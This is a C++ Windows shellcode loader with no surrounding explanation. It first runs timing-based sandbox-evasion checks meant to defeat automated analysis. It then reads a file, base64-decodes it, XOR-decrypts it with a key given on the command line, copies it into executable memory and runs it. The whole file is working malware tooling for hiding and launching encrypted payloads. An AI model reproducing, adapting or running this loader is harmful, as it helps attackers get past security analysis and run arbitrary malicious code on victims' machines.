#include <windows.h>
#include <chrono>
#include <thread>
#include <vector>

using namespace std;
using namespace std::chrono;

void isTimeAccelerated() {
    auto start = steady_clock::now();
    this_thread::sleep_for(seconds(5));
    auto end = steady_clock::now();
    auto duration = duration_cast<milliseconds>(end - start);
    
    while (duration.count() < 5000) {
        double* pvalue = new double;
        *pvalue = 29494.99;
        delete pvalue;
    }
}

void ddt() {
    while (true) {
        int counter = 1;
        auto start_time = high_resolution_clock::now();
        
        while (true) {
            auto current_time = high_resolution_clock::now();
            auto duration = duration_cast<seconds>(current_time - start_time);
            if (duration.count() >= 5) break;
            counter++;
        }
        
        if (counter > 90000000) break;
        
        double* pvalue = new double;
        *pvalue = 29494.99;
        delete pvalue;
    }
}

vector<unsigned char> base64_decode(const char* encoded_string, int len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    vector<unsigned char> ret;
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    
    while (in_ < len) {
        char c = encoded_string[in_];
        if (c == '=') break;
        
        const char* pos = nullptr;
        for (int k = 0; k < 64; k++) {
            if (base64_chars[k] == c) {
                pos = &base64_chars[k];
                break;
            }
        }
        
        if (!pos) {
            ++in_;
            continue;
        }
        
        char_array_4[i++] = c;
        ++in_;
        
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                for (j = 0; j < 64; j++) {
                    if (base64_chars[j] == char_array_4[i]) {
                        char_array_4[i] = j;
                        break;
                    }
                }
            }
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) {
            for (int k = 0; k < 64; k++) {
                if (base64_chars[k] == char_array_4[j]) {
                    char_array_4[j] = k;
                    break;
                }
            }
        }
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        for (j = 0; j < i - 1; j++) ret.push_back(char_array_3[j]);
    }
    
    return ret;
}

void apply_xor(vector<unsigned char>& data, const char* ps, int ps_len) {
    if (ps_len == 0) return;
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= (unsigned char)ps[i % ps_len];
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3 || lstrcmpA(argv[1], "-file") != 0) return -1;
    
    isTimeAccelerated();
    ddt();
    
    HANDLE hFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    vector<unsigned char> fileData(fileSize);
    
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    const char* ps = nullptr;
    int ps_len = 0;
    for (int i = 3; i < argc; ++i) {
        if (lstrcmpA(argv[i], "-ps") == 0 && i + 1 < argc) {
            ps = argv[i + 1];
            ps_len = lstrlenA(ps);
            break;
        }
    }
    
    if (ps) {
        fileData = base64_decode((const char*)fileData.data(), fileData.size());
        apply_xor(fileData, ps, ps_len);
    }
    
    LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMemory) return -1;
    
    memcpy(execMemory, fileData.data(), fileData.size());
    
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc shellcodeFunc = (ShellcodeFunc)execMemory;
    shellcodeFunc();
    
    VirtualFree(execMemory, 0, MEM_RELEASE);
    return 0;
}
